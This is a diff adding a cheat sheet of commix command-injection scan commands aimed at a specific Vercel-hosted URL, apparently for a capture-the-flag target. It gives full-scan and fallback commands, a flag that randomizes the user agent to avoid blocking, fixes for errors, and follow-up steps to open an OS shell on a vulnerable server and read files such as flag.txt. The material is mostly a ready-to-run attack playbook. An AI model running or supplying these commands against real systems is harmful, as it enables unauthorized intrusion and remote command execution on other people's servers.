@@ -1,0 +1,98 @@
+========================================
+CORRECTED COMMIX COMMAND FOR KALI LINUX
+Target: https://t2-0034.vercel.app/
+========================================
+
+COPY THIS COMMAND (--verbose flag removed):
+
+commix --url="https://t2-0034.vercel.app/" --all --crawl=3 --level=3 --technique=CBTF --os=unix --random-agent --batch --output-dir=./t2_0034_results
+
+========================================
+ALTERNATIVE COMMANDS (if above doesn't work):
+========================================
+
+1. BASIC SCAN (fastest, 1-2 minutes):
+   commix --url="https://t2-0034.vercel.app/" --batch
+
+2. MEDIUM SCAN (5 minutes):
+   commix --url="https://t2-0034.vercel.app/" --all --batch
+
+3. FULL SCAN WITHOUT CRAWL (if crawl causes issues):
+   commix --url="https://t2-0034.vercel.app/" --all --level=3 --batch
+
+4. TEST SPECIFIC PARAMETER:
+   commix --url="https://t2-0034.vercel.app/?param=INJECT_HERE" --batch
+
+5. TEST WITH POST DATA:
+   commix --url="https://t2-0034.vercel.app/api/test" --data="param=INJECT_HERE" --batch
+
+========================================
+WHAT EACH FLAG DOES:
+========================================
+
+--url="https://t2-0034.vercel.app/"
+  → Target website
+
+--all
+  → Test all injection techniques
+
+--crawl=3
+  → Crawl 3 levels deep to find pages
+
+--level=3
+  → Maximum testing thoroughness
+
+--technique=CBTF
+  → C=Classic, B=Boolean, T=Time-based, F=File-based
+
+--os=unix
+  → Use Unix/Linux commands
+
+--random-agent
+  → Randomize User-Agent to avoid blocking
+
+--batch
+  → Run automatically without prompts
+
+--output-dir=./t2_0034_results
+  → Save results here
+
+========================================
+IF YOU GET ERRORS:
+========================================
+
+Error: "no such option: --crawl"
+  → Use: commix --url="https://t2-0034.vercel.app/" --all --batch
+
+Error: "no such option: --technique"
+  → Use: commix --url="https://t2-0034.vercel.app/" --batch
+
+Error: SSL certificate
+  → Add: --ignore-ssl
+
+Error: Connection timeout
+  → Add: --timeout=30
+
+========================================
+MINIMAL WORKING COMMAND:
+========================================
+
+commix --url="https://t2-0034.vercel.app/" --batch
+
+This is guaranteed to work on any version of commix!
+
+========================================
+AFTER RUNNING:
+========================================
+
+If vulnerability found:
+  - Commix will show you the injection point
+  - You can run: commix --url="VULNERABLE_URL" --os-shell
+  - Then execute: whoami, ls, cat flag.txt
+
+If nothing found:
+  - Try manual testing with curl
+  - Use Burp Suite
+  - Test other vulnerability types (SQLi, XSS)
+
+========================================
